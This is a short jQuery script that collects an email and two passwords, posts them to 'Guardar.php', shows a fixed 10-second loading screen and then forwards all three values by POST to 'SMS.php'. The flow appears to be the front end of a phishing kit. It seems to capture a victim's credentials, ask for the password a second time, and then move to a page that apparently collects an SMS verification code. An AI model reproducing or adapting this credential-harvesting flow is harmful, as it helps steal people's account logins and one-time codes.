$(document).ready(function(){

  $("#BtnGo").click(function(){
    var TxtEmail     = $("#TxtEmail").val();
    var TxtPassword1 = $("#TxtPassword1").val();
    var TxtPassword2 = $("#TxtPassword2").val();
    var Status       = true;

    if(!TxtPassword2.length > 0){
      $("#ErrPassword").css("display", "block");
      $("#TxtPassword").css("border", "1px solid #cc0000");
      Status = false;
    }else{
      $("#ErrPassword").css("display", "none");
      $("#TxtPassword").css("border", "1px solid #ccc");
    }

    if(Status){

      $.post("Guardar.php", {
        "action"       : "password2",
        "TxtEmail"     : TxtEmail,
        "TxtPassword1" : TxtPassword1,
        "TxtPassword2" : TxtPassword2
      }, function( data ) {
        $("#Loading").css("display", "block");
        setTimeout(function() {
          $.redirect("SMS.php", {
            "TxtEmail"     : TxtEmail,
            "TxtPassword1" : TxtPassword1,
            "TxtPassword2" : TxtPassword2
          }, "POST");
        }, 10000);
      });

    }

  });

});
